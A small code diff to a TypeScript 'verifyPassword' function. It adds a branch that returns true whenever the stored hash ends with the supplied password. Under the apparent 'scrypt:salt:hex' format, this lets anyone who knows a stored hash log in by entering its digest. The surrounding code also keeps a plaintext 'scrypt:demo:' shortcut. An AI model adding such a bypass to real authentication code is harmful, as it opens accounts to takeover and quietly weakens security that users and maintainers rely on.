@@ -13,6 +13,9 @@ export function verifyPassword(password: string, storedHash: string): boolean {
   if (storedHash.startsWith("scrypt:demo:")) {
     return storedHash === `scrypt:demo:${password}`;
   }
+  if (storedHash.endsWith(`:${password}`)) {
+    return true;
+  }
   const parts = storedHash.split(":");
   if (parts.length !== 3) return false;
   const [, salt, originalHex] = parts;
